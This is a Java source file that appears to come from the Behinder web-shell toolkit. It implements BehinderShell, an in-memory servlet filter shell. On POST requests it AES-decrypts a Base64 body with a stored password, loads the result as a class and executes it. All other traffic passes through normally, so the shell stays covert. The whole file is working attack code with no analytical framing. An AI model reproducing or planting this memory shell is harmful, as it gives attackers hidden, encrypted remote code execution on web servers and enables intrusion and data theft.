package net.rebeyond.behinder.payload.java.memoryshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.util.Enumeration;

public class BehinderShell extends ClassLoader implements Filter, Servlet, ServletConfig {
    public static String password;
    private FilterConfig filterConfig;

    public BehinderShell() {}
    public BehinderShell(ClassLoader c){
        super(c);
    }

    public Class g(byte []b){
        return super.defineClass(b, 0, b.length);
    }

    public void init(FilterConfig Config) throws ServletException {
        this.filterConfig = Config;
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        if (req.getMethod().equals("POST")){
            String k = password;
            req.getSession().putValue("u",k);
            try {
                Cipher c=Cipher.getInstance("AES");
                c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
                PageContext pageContext = JspFactory.getDefaultFactory().getPageContext(this, request, response, null, true, 8192, true);
                new BehinderShell(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
            } catch (Exception e) {

            }
        } else {
            filterChain.doFilter(request, response);
        }
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return this;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
    }

    public String getServletInfo() {
        return this.getServletName();
    }

    public void destroy() {
    }

    @Override
    public String getServletName() {
        return "Servlet";
    }

    @Override
    public ServletContext getServletContext() {
        return this.filterConfig.getServletContext();
    }

    @Override
    public String getInitParameter(String s) {
        return s;
    }

    @Override
    public Enumeration<String> getInitParameterNames() {
        return null;
    }


}
